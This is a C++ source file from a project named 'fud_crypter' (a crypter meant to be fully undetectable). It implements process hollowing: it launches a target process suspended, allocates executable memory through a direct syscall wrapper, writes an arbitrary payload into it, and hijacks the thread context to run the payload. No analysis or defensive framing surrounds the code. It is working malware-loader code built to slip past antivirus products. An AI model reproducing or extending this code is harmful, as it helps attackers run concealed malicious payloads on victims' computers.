#include "fud_crypter/hollowing.hpp"
#include "fud_crypter/syscall.hpp"
#include <winternl.h>
#include <cstdint>   // <-- HIÁNYZOTT

namespace fud_crypter {
namespace injection {

bool hollow_process(const std::wstring& target_path, const std::vector<uint8_t>& payload, DWORD creation_flags) {
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = {0};
    if (!CreateProcessW(
        target_path.c_str(),
        nullptr,
        nullptr,
        nullptr,
        FALSE,
        creation_flags | CREATE_SUSPENDED,
        nullptr,
        nullptr,
        &si,
        &pi
    )) return false;

    // NtUnmapViewOfSection
    auto pNtUnmapViewOfSection = reinterpret_cast<NTSTATUS(NTAPI*)(HANDLE, PVOID)>(
        GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtUnmapViewOfSection")
    );

    CONTEXT ctx = { CONTEXT_INTEGER };
    if (!GetThreadContext(pi.hThread, &ctx)) {
        TerminateProcess(pi.hProcess, 0);
        return false;
    }

    PVOID base = nullptr;
    SIZE_T size = payload.size();
    NTSTATUS status = syscall::syscall_NtAllocateVirtualMemory(
        pi.hProcess,
        &base,
        0,
        &size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (!NT_SUCCESS(status)) {
        TerminateProcess(pi.hProcess, 0);
        return false;
    }

    SIZE_T written = 0;
    WriteProcessMemory(pi.hProcess, base, payload.data(), payload.size(), &written);

    ctx.Rcx = reinterpret_cast<uint64_t>(base);
    SetThreadContext(pi.hThread, &ctx);

    ResumeThread(pi.hThread);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return true;
}

} // namespace injection
} // namespace fud_crypter
